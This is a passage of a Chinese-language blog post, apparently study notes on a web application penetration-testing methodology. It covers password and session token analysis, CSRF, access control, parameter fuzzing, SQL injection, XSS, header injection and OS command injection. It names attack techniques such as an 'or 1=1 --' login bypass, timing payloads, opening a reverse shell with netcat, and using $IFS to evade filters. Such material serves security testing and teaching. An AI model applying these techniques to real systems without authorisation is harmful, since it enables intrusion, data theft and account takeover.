<li>尝试重复访问激活 URL，看应用程序如何反应；如果会被拒绝，则在重复访问 URL 之前，先冻结账号，然后看这个 URL 能否使用；</li>
<li>尝试看能否通过激活 URL 为账号设置新密码；</li>
</ul>
<h3 id="测试不安全的密码散列"><a href="#测试不安全的密码散列" class="headerlink" title="测试不安全的密码散列"></a>测试不安全的密码散列</h3><ul>
<li>如果获取到了大量的散列密码，通常这些密码共用某个散列值。此时，可尝试使用最常见的密码进行登录，如果可以登录成功，那么跟散列密码中出现频次最高的密码，很可能可以对应得上；</li>
<li>使用离线的第三方散列算法工具（例如彩虹表）破解明文值;</li>
</ul>
<h3 id="测试逻辑缺陷"><a href="#测试逻辑缺陷" class="headerlink" title="测试逻辑缺陷"></a>测试逻辑缺陷</h3><h4 id="测试故障开放条件"><a href="#测试故障开放条件" class="headerlink" title="测试故障开放条件"></a>测试故障开放条件</h4><ul>
<li>罗列出所有应用程序要求客户端提交用户凭据的功能（例如登录、修改密码等）；</li>
<li>使用受控账户访问以上功能，记录所有请求参数；</li>
<li>重复访问这些功能，但是轮流对参数进行修改，以测试应用程序的代码逻辑，这些修改包括：<ul>
<li>提交空字符串；</li>
<li>删除键值对；</li>
<li>提交非常长的值；</li>
<li>提交非常短的值；</li>
<li>字符串代替数字；</li>
<li>数字代替字符串；</li>
<li>以相同的值，多次提交同一个命名参数；</li>
<li>以不同的值，多次提交同一个命名参数；</li>
</ul>
</li>
<li>仔细检查服务端返回的响应，如果发现异常，进一步测试；</li>
<li>基于异常，添加其他异常参数组合，进一步测试和扩大逻辑缺陷；</li>
</ul>
<h4 id="测试多阶段处理机制"><a href="#测试多阶段处理机制" class="headerlink" title="测试多阶段处理机制"></a>测试多阶段处理机制</h4><ul>
<li>如果应用程序的验证功能涉及多个请求，并在不同的请求中提交凭证，则尝试确定每个请求，并记录每个请求所使用的参数；</li>
<li>重复访问这些功能，修改提交请求的顺序，测试应用程序的处理逻辑，测试方法包括：<ul>
<li>以不同的顺序完成所有阶段，到达目标阶段；</li>
<li>轮流直接进入每一个阶段，然后正常完成后续的阶段；</li>
<li>重复访问功能，轮流省略其他的每一个阶段，然后正常访问后续的阶段；</li>
<li>根据响应结果，进一步有针对性的修改访问顺序，测试和扩大应用程序潜在的逻辑缺陷；</li>
</ul>
</li>
<li>查看是否有某些信息，在各个阶段都重复提交（有可能是由用户主动提交，也有可能是隐藏在表单、cookie、或预设的 URL 查询字符串中）；尝试在不同的阶提交不同的值（有效的，无效的），观察应用程序的响应，看提交的参数是否是多余的，或者在某个阶段确认后，后续应用程序就自动信任它，还是在不同的阶段都会检查；尝试利用多阶段漏洞获得未授权的访问，或者降低多阶段机制所要达到的预期控制目标；</li>
<li>仔细查看客户端发送的请求中的所有参数，有可能应用程序使用这些参数跟踪状态，尝试这些参数，破坏应用程序的逻辑；</li>
<li>有些应用程序会在每个阶段中添加一个随机质询，如有，则可对其进行测试：<ul>
<li>如果质询参数跟用户的其他参数一起提交，则尝试能否改质询的键值，选择自己的质询；</li>
<li>使用相同的用户名，重复访问同一个阶段，但质询是否会不断变化，如果会的话，可以重复访问这个阶段，直到出现自己想要的质询；</li>
</ul>
</li>
</ul>
<h3 id="枚举密码"><a href="#枚举密码" class="headerlink" title="枚举密码"></a>枚举密码</h3><ul>
<li>分析所有在应用程序中找到的漏洞，从中筛选出可利用来实现预期目标的漏洞，例如实现用另外一名用户的身份进行登录；如有可能，最好能实现以管理员的身份进行登录；</li>
<li>在实施攻击之前，应该将应用程序的防御机制纳入考虑，提交攻击效率；例如在枚举用户名时，不要选择随机密码，而是使用最常用的密码，这样有一定概率会命中密码，不至于每个枚举的用户名，全部使用掉一次错误机会。使用广度优先，而不是尝试优先的方法来枚举，并且依次使用最常用的密码，避免同一个账户短时间内太多失败请求，导致账户被冻结；</li>
<li>猜测密码时，应该将密码强度规则和长度规则纳入考虑，提前筛查掉不满足强度要求或长度规则的密码；</li>
<li>使用自动化工具来提交枚举攻击效率；</li>
</ul>
<h2 id="测试会话管理机制"><a href="#测试会话管理机制" class="headerlink" title="测试会话管理机制"></a>测试会话管理机制</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210519085415.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="了解会话管理机制"><a href="#了解会话管理机制" class="headerlink" title="了解会话管理机制"></a>了解会话管理机制</h3><ul>
<li>了解应用程序是如何管理会话状态的。例如是否在每次的请求中使用令牌来标记用户的身份；有些应用程序可能没有使用令牌，而是使用一个加密或模糊处理过的表单来保存用户状态信息（相当于将状态保存在客户端，服务端是无状态的），或者使用 HTTP Authentication 技术来维持状态（它的原理很简单，就是浏览器将用户名和密码等信息保存下来，如果某个 URI 需要验证，浏览器就自动发出凭据，用户无感知）；</li>
<li>如果应用程序使用令牌的话，因为令牌可有多种渠道传送，例如 cookie、查询字符串、隐藏表单、消息体等；因此，可对它们逐个进行排查，看到底是哪个；有时候可能多个渠道同时使用，但实际上不同渠道的值，由不同的后端组件处理。有些看起来很像是令牌的数据，其实并没有用，例如负载均衡亲和性功能所提供的令牌；</li>
<li>找一个必须依赖令牌的页面，例如显示用户个人令牌的页面，然后依次删除请求疑似令牌的参数，看返回的响应是否正常；当出现异常时，即可确认该参数应该是会话令牌；</li>
<li>有些应用程序并没有使用令牌中的完整令牌，而只使用了部分令牌，因此，在找到令牌后，可轮流修改一个字节的值，然后发送请求，看应用程序能否正常返回响应；如果有部分值并未用于确认用户身份，则可以忽略它们；</li>
</ul>
<h3 id="测试令牌的含义"><a href="#测试令牌的含义" class="headerlink" title="测试令牌的含义"></a>测试令牌的含义</h3><ul>
<li>收集令牌：在不同的时间，以不同的账号，登录应用程序，收集应用程序发布的令牌；如果应用程序能够自助注册，则用多个名称相近的账号注册（名称只有一个字符的差别，相同长度不同字符，或者相同字符不同长度）；如果注册时还需要提供额外的身份信息，例如电子邮件，则该信息说不定也会参与到令牌的生成中，因此，也可以对该字段进行系统修改（每两个邮件之间只相关一个字符）；</li>
<li>分析收集到的所有令牌，观察其中是否包含与用户名或者其他用户身份相关数据（如电子邮件）有关的内容；</li>
<li>观察令牌是否使用某种明显的编码或者模糊方案；<ul>
<li>观察用户名长度与令牌长度是否有关，如果相关，则说明很可能使用了模糊处理或某种编码机制；</li>
<li>如果用户名包含相同的字符，则观察令牌中是否包含使用 XOR 异或运算结果的相应序列；</li>
<li>观察令牌是否仅包含十六进制序列，如果是，则说明可能经过了十六进制的编码处理；</li>
<li>观察令牌是否包含等号，以及仅包含 base64 字符集；</li>
</ul>
</li>
<li>如果从令牌中可以观察到规律，则测试是否可以利用这些规律发动攻击，例如利用规律猜测用户程序发给最近用户登录的令牌，然后尝试利用该令牌登录某个依赖令牌的页面，看能否成功；</li>
</ul>
<h3 id="测试令牌的可预测性"><a href="#测试令牌的可预测性" class="headerlink" title="测试令牌的可预测性"></a>测试令牌的可预测性</h3><ul>
<li>快速重复访问某个可返回新令牌的请求，以大量获取连续生成的会话令牌；</li>
<li>观察这些令牌样本，尝试从中寻找规律；此时可使用工具如 Burp Sequencer 来对令牌的随机性进行统计测试；一些注意事项如下：<ul>
<li>令牌中可能部分数据不参与用户身份确认，因此可以忽略它们，只关注那些参与身份验证的内容；</li>
<li>如果看不贴出来令牌数据的类型，则可以尝试多种编码方案（例如 Bases64 ）对其进行解码，看能否转化成更有意义的数据（有时可考虑多种编码方案的组合）；</li>
<li>分析解码后的令牌是否存在规律，计算每两个连续值之间的差；有可能令牌表面看起来没有规律，但是从差值入手，就可以发现规律；这种差值规范可用于提高蛮力攻击的效率；</li>
<li>等待几分钟后，再使用前面的方法重新获取一遍令牌，以观察令牌的生成是否跟时间因素有关；</li>
</ul>
</li>
<li>如果已经找出了一定的规律，再使用一个不同的 IP 地址获取另外一组令牌样本，检查规律是否仍然存在（排查令牌的生成与 IP  地址有关）；以及看能否使用第一组令牌，推导出第二组令牌；</li>
<li>如果已经找到规律和时间依赖关系，则检查是否可以利用该规律，猜测最近发布的新令牌，尝试使用新令牌登录；</li>
<li>另外可以使用 Burp Intruder 工具，对令牌中的每个位进行翻转修改，看是否会造成令牌失效，或者变成另外一名用户的身份；</li>
</ul>
<h3 id="检查不安全的令牌传输"><a href="#检查不安全的令牌传输" class="headerlink" title="检查不安全的令牌传输"></a>检查不安全的令牌传输</h3><ul>
<li>以正常方式依次访问应用程序，从主页开始，到登录，到访问其他所有功能。记录所有发布令牌的位置，并留意哪些部分使用 HTTP 通信，哪些使用 HTTPS 通信（可通过拦截器的日志观察到这些信息）；</li>
<li>如果应用程序使用 cookie 字段传送信息，则观察 cookie 值，看是否启用了 httpOnly 和 Secure 选项；</li>
<li>如果令牌是通过 HTTP 传送的话，则令牌很容易被拦截；</li>
<li>如果应用程序未登录前使用 HTTP，在登录后使用 HTTPS，则留意登录后是否发布了新令牌，如果没有发布新令牌，仍然使用旧令牌，则旧令牌在 HTTP 阶段就已经可以被拦截了；</li>
<li>如果进入了 HTTPS 访问的页面后，页面上存在 HTTP 链接，则可以尝试访问它们，观察此时提交的令牌是否仍然有效，还是会被服务端终止；</li>
</ul>
<h3 id="检查日志中泄露的令牌"><a href="#检查日志中泄露的令牌" class="headerlink" title="检查日志中泄露的令牌"></a>检查日志中泄露的令牌</h3><ul>
<li>如果在解析应用程序过程中，发现应用程序有日志、管理、监控等功能，那么留意这些功能是否泄露会话令牌；检查访问这些功能的权限。如果只有管理员能够访问，低权限用户访问不到，则看有没有其他漏洞可加以利用，来协助访问这些功能；</li>
<li>有时候，某些特殊的原因，会导致开发者会在 URL 中传送令牌；此时如果用户访问站外链接，会导致在 Referer 消息头中泄露令牌；因此，特别留意是否有某个页面，可以被任意其他用户查看访问，同时用户可以在该页面插入任意的站外链接，例如个人自我介绍页面；</li>
<li>如果能够收集到大量的其他用户令牌，则对它们进行排查，看里面是否有某个令牌刚好属于管理员；</li>
</ul>
<h3 id="测试令牌会话映射"><a href="#测试令牌会话映射" class="headerlink" title="测试令牌会话映射"></a>测试令牌会话映射</h3><ul>
<li>用同一个账号，在不同的浏览器或不同的电脑登录应用程序，看登录后的两个会话是否同时有效，如果是的话，说明应用程序支持并行会话。这将使得攻击者即使使用其他用户的身份登录，也不会被检测出来；</li>
<li>用同一个账号，在不同的浏览器或不同的电脑登录并退出应用程序，然后查看是否会发布新令牌，还是仍然有原来的旧令牌；如果旧令牌仍然有效，则开发者对会话的使用有错误，在用户退出后，没有及时终止会话。而是使用持久性的某个字符串来代表用户身份，非常危险；</li>
<li>如果令牌的内容包含某种特定的结构和意义，设法将有意义的部分和无意义的部分标识出来；尝试修改其他跟用户身份有关的部分，让其指向其他用户，然后用修改后的令牌登录，看是否有效；</li>
</ul>
<h3 id="测试会话终止"><a href="#测试会话终止" class="headerlink" title="测试会话终止"></a>测试会话终止</h3><ul>
<li>检查应用程序是否会执行会话终止<ul>
<li>登录，获得令牌</li>
<li>等待一段时间，用该令牌访问受保护页面（如个人资料页）；</li>
<li>如果页面正常显示，说明令牌依然有效；</li>
<li>重复上述步骤，了解令牌的有效期 ；</li>
<li>如果一个令牌在连续提交请求的很长一段时间内（如几天），都一直有效，有可能它的有效期是按照最后一次请求来计算的，此时可配置 Burp Intruder 之类的工具递增每次请求之间的间隔。例如每次的间隔，都是上一次的2 倍；</li>
</ul>
</li>
<li>检查退出功能是否真正起作用；登录，退出，使用令牌再次访问受保护页面，如果访问成功，则说明服务端在用户退出后，并没有真正关闭会话；</li>
</ul>
<h3 id="测试会话固定"><a href="#测试会话固定" class="headerlink" title="测试会话固定"></a>测试会话固定</h3><ul>
<li>没有登录的用户也会得到令牌，并且在登录后，令牌不变，则存在会话固定漏洞；</li>
<li>如果登录后才发布令牌，再次访问登录页面，用另外一个账号登录，如果此时应用程序没有发布新令牌，则也同样存在会话固定漏洞；</li>
<li>观察令牌的格式，尝试使用一个符合格式，但值是虚构的令牌进行登录。如果可以登录成功，则说明有会话固定漏洞；</li>
<li>如果应用程序有发布令牌，但没有登录功能。在显示某些敏感数据时，会使用令牌，则可能存在会话固定漏洞。可用前三种方法，尝试访问敏感数据；</li>
</ul>
<h3 id="检查-CSRF"><a href="#检查-CSRF" class="headerlink" title="检查 CSRF"></a>检查 CSRF</h3><ul>
<li>如果应用程序完全依靠 HTTP cookie 来传送令牌，则它有可能容易受到 CSRF 攻击；</li>
<li>分析应用程序的关键功能，查看执行这些功能的请求，其参数能否由攻击者完全自行设定，例如参数中不包含任何用于验证身份的令牌，如令牌、随机数或者密码等；那么这些功能有很大的漏洞，可被攻击者轻易利用；</li>
<li>攻击者可以创建一个 HTML 页面，在无须用户执行任何动作的情况，自动将请求发送出去；<ul>
<li>GET 请求：将目标 URL 放在 <img> 标签中即可；</li>
<li>POST 请求：做一个表单，参数默认址设置好。并 JS 代码监听页面加载事件，加载时，触发发送该表单；</li>
</ul>
</li>
<li>如果应用程序为了防御 CSRF 攻击，要求在请求中提交令牌，则可以使用测试会话令牌的办法，对页面上的令牌进行可靠性测试；并测试应用程序是否存在 UI 伪造漏洞，如果有的话，也可用于突然 CSRF 防御；</li>
</ul>
<h3 id="检查-cookie-作用域"><a href="#检查-cookie-作用域" class="headerlink" title="检查 cookie 作用域"></a>检查 cookie 作用域</h3><ul>
<li>如果应用程序使用 cookie 来传送令牌，则检查 cookie 的相关属性，例如其作用域、路径等；</li>
<li>如果 cookie 的使用范围很宽泛，例如指向根目录。那么攻击者有可能利用服务端使用相同根目录的其他应用程序发布的 cookie 来访问，即用 A 程序发布的 cookie，来访问 B 程序。两个程序共享 cookie 根目录；</li>
<li>如果应用程序以它自己的域名作为 cookie 的有效范围，但如果它的子域上面存在其他应用程序的话，也同样存在上一步中的相同问题（当然，有可能它的子域上面，并没有运行任何其他程序）；</li>
<li>找出那些使用路径进行隔离的场景，利用跨站点脚本破坏这种隔离；</li>
<li>找出所有应用程序发布的 cookie 的域名和对应的路径，从这些域名和路径中，排查是否存在其他应用程序，并确定是否可以使用相同的 cookie 访问它们；以及反过来，是否可以利用它们获得 cookie，访问目标应用程序；</li>
</ul>
<h2 id="测试访问控制"><a href="#测试访问控制" class="headerlink" title="测试访问控制"></a>测试访问控制</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210521083256.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="了解访问控制要求"><a href="#了解访问控制要求" class="headerlink" title="了解访问控制要求"></a>了解访问控制要求</h3><ul>
<li>根据应用程序的功能，分析其访问控制机制<ul>
<li>垂直隔离：访问不同的功能，需要不同的权限；</li>
<li>水平隔离：相同功能，访问不同的数据，需要不同的权限；例如普通用户只能看自己的数据，管理员可以查看所有用户的数据；</li>
</ul>
</li>
<li>根据应用程序解析结果，找出那些最有可能用来实施权限提升攻击的功能区域与数据资源类型；</li>
<li>为了提高测试效率，最好先获得大量不同垂直权限和水平权限的账号；如果应用程序允许自助注册，那么获得大量水平权限账号是很容易的。至于不同垂直权限的账号，有可能也允许自助注册。如果不行，则需要利用某个漏洞，来访问某个高权限账号；或者直接联系应用程序所有者，让其帮忙开通账号进行测试；</li>
</ul>
<h3 id="使用多个账号测试"><a href="#使用多个账号测试" class="headerlink" title="使用多个账号测试"></a>使用多个账号测试</h3><ul>
<li>如果存在垂直权限隔离，那么先使用高权限账号，访问整个应用程序，确定它能够访问的所有功能；然后，再使用一个低权限账号，访问上述所有功能，看哪些功能被隔离了。具体办法如下：<ul>
<li>使用高权限账号登录，开启 Burp 工具，监听流量，生成站点地图；</li>
<li>检查站点地图是否完整，已包含待测试功能；</li>
<li>退出高权限账号，使用低权限账号登录；</li>
<li>使用比较站点地图的功能，看低权限用户是否能够访问原高权限账号访问过的那些功能；</li>
</ul>
</li>
<li>如果存在水平隔离，则使用两个拥有相同垂直权限的不同账号，尝试用 A 账号访问 B 账号的数据；一般通过修改请求中的标识符来指定访问其他用户的资源；</li>
<li>手动关键的访问控制：检查每个用户权限下可访问的资源，然后使用未授权的账号，尝试对这些资源发起请求；</li>
<li>在测试访问控制时，特别注意多阶段功能，对每个阶段分别进行测试。看应用程序是否假设当前阶段的请求，已经通过了上个阶段的测试；</li>
</ul>
<h3 id="使用有限的权限测试"><a href="#使用有限的权限测试" class="headerlink" title="使用有限的权限测试"></a>使用有限的权限测试</h3><ul>
<li>如果没有拥有多个不同垂直权限和水平权限的账号，则测试访问控制漏难度很大，因为不知道所有资源的 URL、标识符、参数等重要信息，导致很多漏洞难以发现；</li>
<li>假设测试员只能使用低权限账号进行测试，在解析应用程序的过程中，有可能会找到访问高级功能的 URL（如管理功能），如有的话，可尝试利用其中的漏洞提高账号的权限；</li>
<li>大多数受到水平隔离的资源，会使用某个标识符来对数据进行访问。因此，可以尝试生成一系列紧密相连的标识，识别标识符之中是否存在规律，用找到的规律来猜测其他标识符；</li>
<li>使用自动化工具，使用枚举出的标识符发起资源请求，看能否成功；</li>
</ul>
<h3 id="测试不安全的访问控制方法"><a href="#测试不安全的访问控制方法" class="headerlink" title="测试不安全的访问控制方法"></a>测试不安全的访问控制方法</h3><ul>
<li>有些应用程序很搞笑，通过客户端传输的参数来控制权限，例如 edit=false、access=read 等；如果发现这类型的参数的话，可尝试修改它们，看服务端如何反应；</li>
<li>有些应用程序使用 Rerefer 字段来控制权限，仅当 Referer 字段的值指向某个特定来源的时候（例如管理员才能访问的 URL），才允许访问当前资源；在访问特权页面时，留意 Referer 消息头的值，并尝试修改这个值，看是否会导致访问失败，如果会的话，说明应用程序很可能基于该字段控制权限；</li>
<li>如果应用程序允许使用 HEAD 方法，说明服务端可能使用某种容器托管方案，可进一步测试是否存在托管漏洞；</li>
</ul>
<h2 id="测试基于输入的漏洞"><a href="#测试基于输入的漏洞" class="headerlink" title="测试基于输入的漏洞"></a>测试基于输入的漏洞</h2><p>很多重要的漏洞，都源于未对输入进行严格检查造成的，这种漏洞可出现在应用程序的任意位置；通过一组预生成的有效攻击荷载，轮流对请求中的每个参数进行测试，是探查这类漏洞的通用方法；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523081043.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="模糊测试所有请求参数"><a href="#模糊测试所有请求参数" class="headerlink" title="模糊测试所有请求参数"></a>模糊测试所有请求参数</h3><ul>
<li>找出所有传递参数的位置，通常这些位置包括：查询字符串、消息主体、消息头（如Referer、User-Agent、Cookie 等）；</li>
<li>使用自定义脚本或者第三方工具，轮流对每一个参数进行单独的测试；在 Burp 套件中，可将拦截到的请求发送到 Intruder 模块进行处理即可；</li>
<li>配置一组有效的攻击荷载（可选择一个预告设定的列表，或者加载外部文件）；如果对每个参数都发送所有攻击荷载，显示不是效率最高的做法，可针对那些最常见的漏洞优先安排测试，这些常见漏洞包括：<ul>
<li>SQL 注入： <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083138.png" srcset="/img/loading.gif" lazyload></li>
<li>XSS 与消息头注入：  <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083218.png" srcset="/img/loading.gif" lazyload></li>
<li>命令注入：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083343.png" srcset="/img/loading.gif" lazyload></li>
<li>路径遍历：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083422.png" srcset="/img/loading.gif" lazyload></li>
<li>脚本注入：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083440.png" srcset="/img/loading.gif" lazyload></li>
<li>文件包含：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083509.png" srcset="/img/loading.gif" lazyload></li>
</ul>
</li>
<li>为了便于理解，上一步截图中的有效攻击荷载都是以字面量显示，实际中，由于有些字符属于 HTTP 规范的关键字，因此在使用的时候，需要对它们进行 URL 编码；通常情况下，Intruder 工具会对它们进行编码（除非该选项被禁用了）</li>
<li>除了发送模糊请求外，还需要配置一些异常关键字和模糊参数本身（例如 Intruder 中的 Grep 功能），用来识别预示漏洞可能存在的响应，例如：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210523083847.png" srcset="/img/loading.gif" lazyload></li>
<li>另外文件包含漏洞需要搭建一个 Web 服务并监控收到的请求，以便当漏洞存在时，应用程序可向该 Web 服务发送请求；</li>
<li>手工检查筛选出的所有异常响应，包括 HTTP 状态码、响应长度、响应时间、响应内容等；</li>
<li>根据异常内容，分析其可能存在的漏洞，对漏洞位置再次进行确认，并思考如何利用这些漏洞；</li>
<li>一旦配置完毕，完成对某个请求的模糊测试后，接下来对其他请求进行测试就可以开始快速自动化了；</li>
<li>如果在解析应用程序的过程中，发现应用程序使用某种带外通道来传输可由用户控制的数据，也不要遗漏利用这些通道提交测试请求；为了让测试更高效，可自定义测试脚本；</li>
<li>除了手动测试外，还可以运行自动化的扫描器，并比较手工和自动两份结果，兼听则明；</li>
</ul>
<h3 id="测试-SQL-注入"><a href="#测试-SQL-注入" class="headerlink" title="测试 SQL 注入"></a>测试 SQL 注入</h3><p>在模糊测试过程中，如果发现某个位置可能存在 SQL 注入漏洞，则可进一步手工详细探查；</p>
<ul>
<li>分析错误消息的语义（常用数据库软件的语义可参数第 9 章）；</li>
<li>当在模糊测试过程中提交一个单引号触发异常时，可在请求中提交两个单引号形成配对，看异常是否会消失；如果会的话，则说明漏洞很可能存在；</li>
<li>使用 SQL 连接符构建一个良性输入，然后观察它的响应是否跟未使用连接符的情况相同；如果会的话，说明漏洞可能存在（记得对字符器进行 URL 编码）；</li>
<li>如果正常的参数中包含数字，则可以使用表达式来替代数字，表达式的计算结果跟原值相同；如果响应程序能够正常响应，则说明漏洞很可能存在；</li>
<li>如果前面的步骤发现潜在漏洞后，可尝试提交针对 SQL 设计的数学表达式，构造一个特殊的值，来进一步确定漏洞。如果请求能够成功，则可以几乎肯定漏洞存在。表达式示例：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210525084953.png" srcset="/img/loading.gif" lazyload>，两个表达式的结果都为 2；</li>
<li>如果在请求参数中使用 waitFor 命令可以造成响应的明显延迟，则说明后端数据为 MS-SQL，且漏洞可能存在；可手动设置 waitFor 为不同大小的值，看是否响应时间会出现对应的变化。（可以同时在多个 SQL 查询中插入 waitFor，理论上响应时间会呈现为预置值的固定倍数）；</li>
<li>如果应用程序存在 SQL 注入漏洞，则应考虑这个漏洞可以用来做点什么其他的，例如：<ul>
<li>通过修改 WHERE 子句中的条件，改变应用程序的逻辑（例如通过  or 1=1 -- 来避开登录限制）；</li>
<li>通过 UNION 操作符注入 SELECT 查询，将查询结果跟原始查询结果组合在一起；</li>
<li>通过 SQL 指纹语法来探测后端的数据库类型；</li>
<li>如果是 MS-SQL 数据库，并且应用程序会在响应中返回 ODBC 错误消息，则可以利用错误消息，获取任意的数据；</li>
<li>如果上一步行不通，可以尝试以下技巧来提取数据：<ul>
<li>获取字符串数据的数字格式，一次提取一个字节；</li>
<li>使用带外通道；</li>
<li>如果可以根据条件判断获取不同的响应，则可以通过 abcinthe 一次一比特的提取数据；</li>
<li>如果可以根据条件触发延迟，则可以用延迟与否来提取数据，也是一次一比特；</li>
</ul>
</li>
<li>如果应用程序对某些字符串和表达式实施过滤，尝试第9章的技巧避开过滤；</li>
<li>如有可能，利用漏洞以及功能强大的数据库函数，将攻击范围扩大到数据库和基础服务器；</li>
</ul>
</li>
</ul>
<h3 id="测试-XSS-和其他响应注入"><a href="#测试-XSS-和其他响应注入" class="headerlink" title="测试 XSS 和其他响应注入"></a>测试 XSS 和其他响应注入</h3><h4 id="确定反射位置"><a href="#确定反射位置" class="headerlink" title="确定反射位置"></a>确定反射位置</h4><ul>
<li>基于模糊测试得到的结果，先进行分类（例如 Burp 中可使用 “有效载荷 grep“ 来分类），然后查看哪些位置原样返回了 XSS 测试字符串；</li>
<li>查看字符串的位置<ul>
<li>如果出现在响应主体中，可测试 XSS 漏洞；</li>
<li>如果出现在 HTTP 消息头中，可测试消息头注入漏洞；</li>
<li>如果出现在 302 响应的 Location 字段中，可测试重定向漏洞；</li>
</ul>
</li>
</ul>
<p>同一个请求参数，可能出现在多个位置，表明应用程序有可能同时存在多种漏洞；</p>
<h4 id="测试主体注入"><a href="#测试主体注入" class="headerlink" title="测试主体注入"></a>测试主体注入</h4><ul>
<li>当请求参数值反射在响应主体中时，观察反射位置周围的 HTML 写法，思考如何针对性的设计相应的注入内容，以便可以执行任意的 JS 脚本，例如可通过注入 script 标签 + JS代码来实现，也可以注入到 HTML 标签属性值；</li>
<li>尝试向应用程序提交各种可能的内容，并监控它的响应，看应用程序是否采用某种过滤和净化机制；</li>
<li>如果发现有过滤机制，则在设计注入内容时，可参考第12章提到的各种技巧，避开这些检查，让浏览器能够执行预期的脚本；</li>
<li>如果 XSS 漏洞是 POST 类型，一种利用方法是建立第三方恶意站点，诱使用户发出 POST 请求；</li>
</ul>
<h4 id="测试消息头注入"><a href="#测试消息头注入" class="headerlink" title="测试消息头注入"></a>测试消息头注入</h4><ul>
<li>如果反射出现在响应的报头部分，则尝试在参数中发送经过 URL 编码的回车和换行符，看它们是否能够在响应中返回（返回后的符号应不再是 URL 编码，而是已经解码）；</li>
<li>如果在返回的响应中发现新增了一行，则说明漏洞很可能存在；可根据第 13 章的技巧进行攻击；</li>
<li>如果在请求中发送两个换行符，但在响应中只返回一个，则可以根据情况尝试设计利用漏洞的办法；</li>
<li>如果应用程序实施某种过滤机制，则可以考虑通过以下技巧来规避：</li>
</ul>
<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210527074810.png" srcset="/img/loading.gif" lazyload style="zoom:150%;" />

<h4 id="测试任意重定向"><a href="#测试任意重定向" class="headerlink" title="测试任意重定向"></a>测试任意重定向</h4><ul>
<li>如果反射出现在重定向内容中，则可以尝试利用漏洞，将重定向指向某个专门设计的钓鱼网站，提升网站的可信度；</li>
<li>如果请求参数发送的是绝对 URL，则尝试修改该 URL 中的域名，看是否会重定向到指定的域；</li>
<li>如果请求参数发送的是相对 URL，则尝试将其修改为绝对 URL，看是否会重定向到指定的域；</li>
<li>如果应用程序为了防御重定向漏洞，实施一定的过滤机制，则可尝试使用第 13 章的技巧来规避过滤；</li>
</ul>
<h4 id="测试保存型攻击"><a href="#测试保存型攻击" class="headerlink" title="测试保存型攻击"></a>测试保存型攻击</h4><ul>
<li>很多应用程序都有保存用户输入的功能，并在之后的某个功能中返回保存的数据。如果在模糊测试过滤中，发现响应中出现了匹配字符串（这些字符串不一定是在当前请求中提交的），则可以尝试找一下初始是哪个请求发送的数据；</li>
<li>有时候需要完成多阶段步骤，数据才能保存成功。此时可尝试手动完成所有步骤，然后检查数据是否保存成功并返回；</li>
<li>如果应用程序有垂直权限控制，则可以尝试登录高权限的账号，然后看其是否能够使用某个功能去查看低权限账号的数据。如果可以并存在保存型漏洞的话，那么这个漏洞很可能可以用来提升低权限账号的权限；</li>
<li>查找所有保存用户提交的数据的情况，并测试其是否也包含 XSS 漏洞和其他响应注入漏洞；</li>
<li>如果某个用户提交的数据，可以被其他用户查看，则漏洞可能被用来实施会话劫持攻击或者请求伪造攻击；</li>
<li>如果某个用户提交的数据，仅自己可以查看，则可以尝试配合其他漏洞，修改其他用户的数据，让其包含恶意脚本；</li>
<li>如果应用程序支持文件的上传和下载，则可以进一步分析是否允许上传 HTML、JAR或者文本文件，并且没有过滤其中包含的内容，那么很大概率存在漏洞。<ul>
<li>如果应用程序允许上传 JPEG 图片，但没有检测是否包含有效的内容，则可用来实施针对 IE 用户的攻击；</li>
<li>注意测试应用程序如何对不同类型的文件做出处理，以及浏览器如何处理包含 HTML 而非正常内容，以便有针对性的设计内容，实现预期的目的；</li>
</ul>
</li>
<li>如果应用程序对保存型 XSS 漏洞实施过滤机制，则分析这种过滤机制是否导致其出现本站点请求伪造的漏洞；</li>
</ul>
<h3 id="测试-OS-命令注入"><a href="#测试-OS-命令注入" class="headerlink" title="测试 OS 命令注入"></a>测试 OS 命令注入</h3><ul>
<li>当发送有效的命令注入攻击荷载后，如果应用程序的响应时间出现延迟，则可以进一步手动测试，修改参数值，看响应时间是否会随着参数值的变化而变化；</li>
<li>针对找到每一个可注入命令的攻击字符串，尝试将其修改为更加有用的命令（例如  ls、dir 等），然后检查命令的结果能否返回到浏览器；</li>
<li>如果可以就最好，如果不行，则可以尝试以下办法：<ul>
<li>尝试建立带外通道：例如通过 TFTP 上传一些工具到服务器，然后使用 telnet 或者 netcat 和本地主机建立一个反向 shell，也可使用 mail 命令通过 SMTP 机制发送命令结果；</li>
<li>可以尝试将结果的内容输出到 Web 根目录下的某个文件，然后使用浏览器访问它们；</li>
</ul>
</li>
<li>当找到命令注入办法并能够获得命令结果后，下一步是确定权限（例如使用 whoami 命令，或者向一个受保护的目录写入一个文件）；</li>
<li>如果权限很高就最好，如果比较低，就尝试设法提升自己权限，以便可以访问应用程序的所有敏感数据，或者通过被攻破的主机，访问同一网络中的其他主机；</li>
<li>如果已经确定请求中的参数会被提交给某个 OS 命令，但发送的攻击字符串无法攻击成功，则可以尝试使用 > 和 < 两个符号，将某个文件作为命令的输入，或者作为命令的输出；通过这种方法，可以读取和写入任意内容到文件中；</li>
<li>如果能够猜到应用程序执行的命令名称，则可以尝试在请求中携带该命令支持的选项，以便更好的利用命令；</li>
<li>如果发现应用程序针对注入实施过滤防御，则可以尝试在提交的字符串中插入转义字符，看应用程序是否会对转义字符进行转义，如果不会的话，就可以利用这个漏洞避开过滤机制；<ul>
<li>如果发现空白符号被过滤，可以尝试使用 $IFS 来替代 UNIX 系列操作系统中的空格；</li>
</ul>
</li>
</ul>
<h3 id="测试路径遍历"><a href="#测试路径遍历" class="headerlink" title="测试路径遍历"></a>测试路径遍历</h3><ul>
